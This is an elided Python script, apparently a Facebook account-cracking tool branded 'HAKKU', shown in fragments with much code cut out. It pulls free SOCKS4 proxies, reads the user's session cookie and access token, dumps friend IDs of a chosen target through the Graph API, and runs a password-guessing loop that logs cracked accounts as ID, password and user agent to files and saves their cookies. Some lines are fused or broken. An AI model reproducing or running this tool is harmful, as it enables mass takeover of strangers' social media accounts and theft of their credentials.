...
try:
	...
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text	open('.prox.txt','w').write(prox)

except Exception as e:

	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mHAKKU  ')
...
date = 'TODAY DATE--'+str(tgl)+'●'+str(bln)+'/'+str(thn)
...
def login_lagi334():
	...
	try:
		...
		print(f'  {u}[{h}HAKKU  {u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
...
class teman_teman:
    ...
    def __init__(self):
        ...
        try:
            ...
            self.my = re.search('c_user=(.*?);',str(cok)).group(1)

        except Exception as e:print(e);exit()

        self.target = input('       %s[%s•%s] %sMasukkan ID : %s'%(J,P,J,P,J))

        pl = input('       %s[%s•%s] %sINPUT ID Young old [m/t] : %s'%(J,P,J,P,J))

        if pl in ['1','01','m','M','a']:

            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={tokenku}'

            self.files = ('HAKKUdump%s.txt'%(self.target))
            ...
            self.files = ('HAKKUdumpnew%s.txt'%(self.target))
            ...
            try:
                ...
                if stat == True:
                    ...
                    for p in id3:
                        ...
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={tokenku}'
    ...
    def tua_dev(self,url,cookie,token,stat):
        ...
        with requests.Session() as xyz:
            ...
            try:
                    ...
                    for o in id4:
                        ...
                        if len(gabung_sandi) != 1:
                            ...
                            for x in range(Postingan):
                                ...
                                print("\r       %s[%s•%s] %s Taking %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                        ...
                        print("\r       %s[%s•%s] %sCollecting %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                ...
                print('\r       %s[%s•%s] %s Friends %s%s %sNot Public'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()

                pass

    def lanjut(self):

        print("\n       %s[%s•%s] %sCollected %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
...
def cek_apk(session,coki):
    ...
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cook}).text
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[HAKKU ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}][{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}[HAKKU  -OK] {idf}  {pw}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')

				open('COOKIE.txt').write(kuki+'\n')
